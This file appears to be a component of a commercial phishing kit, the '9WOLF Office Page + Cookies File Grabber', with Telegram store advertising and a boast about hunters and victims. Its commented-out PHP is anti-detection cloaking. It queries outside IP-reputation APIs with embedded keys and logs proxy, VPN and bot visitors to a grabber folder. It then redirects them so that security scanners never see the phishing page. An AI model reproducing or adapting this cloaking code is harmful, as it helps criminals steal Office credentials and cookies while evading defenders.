<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

/*
$v_ip = getIP();
    if($v_ip == "127.0.0.1") {
    }else{
        if($block_proxy_rdp == "on") {
            $9WOLFApi = 'https://api.iptrooper.net/check/'.$v_ip.'?key=eItWRGHj2p';
            $ch = curl_init();
            curl_setopt($ch,CURLOPT_URL,$9WOLFApi);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
            $headers = array();
            $headers[] = 'Authority: api.iptrooper.net';*/
            //$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            /*$headers[] = 'Accept-Language: en-US,en;q=0.9';
            $headers[] = 'Cache-Control: max-age=0';
            $headers[] = 'Cookie: _ga=GA1.2.1458854585.1673529258; _gid=GA1.2.1231968997.1673529258; ipl=u9mm5f4l9nc5get6m9hiro27p8cdupg1';
            $headers[] = 'Sec-Ch-Ua: \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"';
            $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
            $headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
            $headers[] = 'Sec-Fetch-Dest: document';
            $headers[] = 'Sec-Fetch-Mode: navigate';
            $headers[] = 'Sec-Fetch-Site: none';
            $headers[] = 'Sec-Fetch-User: ?1';
            $headers[] = 'Upgrade-Insecure-Requests: 1';
            $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            $answer = curl_exec($ch);
            curl_close($ch);
            $result = $answer;
            if($result == "1"){
                 $message = ("9WOLF D3cl!n3d =>  [ A1t Pr0xy/V9n|RD9 ] :".$_SERVER['HTTP_USER_AGENT']."\n !p: ". $ip." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");
                 $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
                 fwrite($save,$message);
                 fclose($save);
                 header("Location: ".redirectBot());exit();
             }
            
        }
            // $9WOLFApi = "https://api.iptrooper.net/check/".$v_ip."eItWRGHj2p";
            // $ch = curl_init();
            // curl_setopt($ch,CURLOPT_URL,$9WOLFApi);
            // curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
            // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            // $answer = curl_exec($ch);
            // curl_close($ch);
            // $result = $answer;
            // if($result == "1")
             

        else {
            $isp = print_r($_POST, true);
            $isp = bin2hex($isp);
            $9WOLFApi = "http://highwall.space/check/?ip=".$v_ip."&fingerprint=on&ispinfo=isp&flags=b&api=SKecCwlsiuTDuIT8gZT";
            $ch = curl_init();
            curl_setopt($ch,CURLOPT_URL,$9WOLFApi);
            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $answer = curl_exec($ch);
            curl_close($ch);
            $result = json_decode($answer);
            $a = $result->badbot;
            if($a == "true") {
            $message = ("9WOLF D3cl!n3d =>  [ A1t Pr0xy/V9n|RD9 ] :".$_SERVER['HTTP_USER_AGENT']."\n !p: ". $ip." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");
            $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
            fwrite($save,$message);
            fclose($save);
            header("Location: ".redirectBot());exit();
            }

        }
    }
*/
?>